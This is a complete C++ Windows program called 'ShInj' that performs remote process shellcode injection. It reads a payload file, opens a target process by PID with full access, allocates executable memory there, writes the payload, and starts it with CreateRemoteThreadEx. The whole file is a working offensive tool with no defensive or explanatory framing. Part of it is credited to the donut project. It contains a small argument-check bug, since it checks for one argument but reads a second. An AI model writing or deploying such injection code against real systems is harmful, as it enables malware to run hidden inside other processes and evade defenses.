#pragma warning(disable:4477 6328 6031)

#include <Windows.h>
#include <iostream>

char e[] = "[!]";
char d[] = "[*]";
char i[] = "[+]";

// adapted from donut shellcode (https://github.com/TheWover/donut)

DWORD getdata(LPCSTR path, LPVOID* data) {
	HANDLE hf;
	DWORD  len, rd = 0;

	// 1. open the file
	hf = CreateFileA(path, GENERIC_READ, 0, 0,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hf != INVALID_HANDLE_VALUE) {
		// get file size
		len = GetFileSize(hf, 0);
		// allocate memory
		*data = malloc(len + 16);
		// read file contents into memory
		ReadFile(hf, *data, len, &rd, 0);
		CloseHandle(hf);
	}
	return rd;
}

// end of donut code 

int main(int argc, char* argv[]) {
	printf("%s Starting ShInj.\n", i);

	if (argc < 2) {
		printf("%s Missing PID argument.\n", e);
		return EXIT_FAILURE;
	
	}
	int PID = atoi(argv[1]);
	LPVOID payload;
	LPCSTR cPath = argv[2];
	
	printf("%s Trying to open file %s...", i, cPath);
	DWORD iPayloadSize = getdata(cPath, &payload);
	printf("%s Obtained file contents...", i);

	printf("%s Trying to open process handle at PID %ld...\n", d, PID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Retrieved handle to the process. 0x%p\n", d, hProcess);

	PVOID rBuffer = VirtualAllocEx(hProcess, NULL, iPayloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		printf("%s Error: 0x%lx", e, GetLastError());
	}
	printf("%s allocated %zd-bytes to the process memory.\n", d, iPayloadSize);

	if (rBuffer == NULL) {
		printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, payload, iPayloadSize, NULL);
	printf("%s wrote %zd-bytes to process memory buffer\n", d, iPayloadSize);

	DWORD dwTID = NULL;

	HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld) 0x%p\n", d, dwTID, hProcess);

	printf("%s waiting for thread to finish executing\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing, cleaning up\n", d);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}